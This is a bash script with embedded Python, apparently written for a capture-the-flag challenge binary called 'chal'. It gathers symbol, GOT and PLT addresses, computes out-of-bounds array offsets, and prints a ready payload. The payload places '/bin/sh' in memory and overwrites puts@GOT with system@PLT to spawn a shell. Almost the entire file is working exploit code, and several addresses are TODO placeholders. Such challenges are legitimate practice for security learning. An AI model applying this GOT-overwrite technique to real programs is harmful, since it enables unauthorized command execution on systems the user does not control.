#!/bin/bash
# Run this to get the CORRECT addresses from the provided chal binary

echo "=== Analyzing PROVIDED chal binary ==="
echo ""

echo "[1] Check if this is the original binary (not our compilation):"
ls -lh chal
file chal
echo ""

echo "[2] Get symbol addresses:"
readelf -s chal | grep -E 'values|msg'
echo ""

echo "[3] Get GOT addresses:"
readelf -r chal | grep -E 'puts|system|exit'
echo ""

echo "[4] Get PLT addresses:"
objdump -d chal | grep -E 'system@plt>|puts@plt>'
echo ""

echo "[5] Calculate offsets:"
python3 << 'EOF'
import struct

# TODO: Replace these with actual values from above output
values_base = 0x6010c0  # From readelf -s (look for "values")
puts_got = 0x601020      # From readelf -r (look for "puts")  
system_plt = 0x4006c0    # From objdump (look for "system@plt")
msg_addr = 0x601068      # From readelf -s (look for "msg")

offset_puts = (puts_got - values_base) // 4
offset_msg = (msg_addr - values_base) // 4

binsh1 = struct.unpack('<I', b'/bin')[0]
binsh2 = struct.unpack('<I', b'/sh\x00')[0]

print(f"values_base = {hex(values_base)}")
print(f"puts@GOT = {hex(puts_got)}")
print(f"system@PLT = {hex(system_plt)}")
print(f"msg = {hex(msg_addr)}")
print(f"")
print(f"Offset to puts@GOT: {offset_puts}")
print(f"Offset to msg: {offset_msg}")
print(f"")
print(f"=== PAYLOAD ===")
print(f"0\\n{binsh1}\\n1\\n{binsh2}\\n{offset_msg}\\n{values_base}\\n{offset_msg+1}\\n0\\n{offset_puts}\\n{system_plt}\\n{offset_puts+1}\\n0\\n-1")
EOF
